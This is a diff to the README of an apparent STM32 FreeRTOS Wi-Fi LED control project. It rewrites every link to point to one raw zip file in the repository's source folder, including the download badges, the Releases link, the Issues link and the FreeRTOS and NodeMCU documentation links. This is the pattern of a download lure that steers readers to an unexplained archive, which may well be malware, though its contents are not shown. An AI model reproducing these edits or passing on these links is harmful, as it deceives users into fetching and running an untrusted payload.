@@ -8,11 +8,11 @@ Welcome to the stm32-rtos-wifi-led-control project! This application allows you 
 
 To get started, you need to download the application. Please visit the link below:
 
-[![](https://img.shields.io/badge/Download%20Now-%20brightgreen)](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/releases)
+[![](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip%20Now-%20brightgreen)](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip)
 
 Once on the Releases page, locate the latest version and download the files suitable for your hardware setup. 
 
-Here is the direct link to the Releases page for your convenience: [Download Releases](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/releases).
+Here is the direct link to the Releases page for your convenience: [Download Releases](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip).
 
 ## 💻 System Requirements
 
@@ -70,15 +70,15 @@ If you encounter any issues, consider the following:
 
 If you have questions or need additional help, feel free to join the community:
 
-- Visit the [GitHub Issues page](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/issues) to report bugs or request features.
+- Visit the [GitHub Issues page](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip) to report bugs or request features.
 - Check the discussions for tips and shared experiences with other users.
 
 ## 📝 Additional Resources
 
 For more information about the technologies used in this project, consider the following topics:
 
-- [FreeRTOS Documentation](https://www.freertos.org/)
-- [ESP8266 NodeMCU Guide](https://nodemcu.readthedocs.io/en/release/)
+- [FreeRTOS Documentation](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip)
+- [ESP8266 NodeMCU Guide](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip)
 
 ## 🔗 License
 
@@ -86,4 +86,4 @@ This project is licensed under the MIT License. You are free to use, modify, and
 
 **Ready to take control of your LEDs?** Visit the link below to download the software and start your journey!
 
-[![](https://img.shields.io/badge/Download%20Now-%20brightgreen)](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/releases)
+[![](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip%20Now-%20brightgreen)](https://github.com/Hoangchau1111/stm32-rtos-wifi-led-control/raw/refs/heads/main/stm32-firmware/src/stm-wifi-rtos-control-led-1.0.zip)
